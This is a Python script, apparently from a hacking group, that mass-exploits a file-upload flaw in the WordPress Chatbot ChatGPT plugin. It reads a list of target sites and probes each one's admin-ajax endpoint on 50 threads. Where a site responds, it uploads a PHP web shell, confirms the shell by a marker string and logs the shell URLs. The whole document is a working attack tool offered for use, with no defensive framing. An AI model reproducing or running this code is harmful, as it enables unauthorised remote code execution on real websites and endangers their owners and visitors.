# N4ST4R_ID | D704T Team
# Shell should be in the same folder

import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) < 2:
    sys.exit(f"Usage: python {sys.argv[0]} list.txt")

with open(sys.argv[1], "r") as f:
    sites = [line.strip() for line in f if line.strip()]

sites_with_index = list(enumerate(sites))

result_file = "chatgpt.txt"


def exploit(args):
    site, i = args
    url = f"{site}/wp-admin/admin-ajax.php"
    response = requests.get(url, verify=False, timeout=10)

    if response.text == "0":
        print(f"[+] {site}: Uploading..")

        files = {
            "action": "chatbot_chatgpt_upload_file_to_assistant",
            "file": open("pl.php"),
        }

        requests.post(
            site + "/wp-admin/admin-ajax.php",
            files=files,
            verify=False,
            timeout=10,
        )
        shell = requests.get(
            f"{site}/wp-content/plugins/chatbot-chatgpt/uploads/pl.php",
            verify=False,
            timeout=10,
        )

        if "Naxtarrr" in shell.text:
            print(f"[+] {site}/wp-content/plugins/chatbot-chatgpt/uploads/pl.php")
            with open(result_file, "a") as f:
                f.write(f"{site}/wp-content/plugins/chatbot-chatgpt/uploads/pl.php\n")
        else:
            print(f"[-] {site} Shell Failed")

    else:
        print(f"[-] {site}: Not Vulnerable")


with ThreadPoolExecutor(max_workers=50) as executor:
    for i, site in sites_with_index:
        executor.submit(exploit, (site, i))
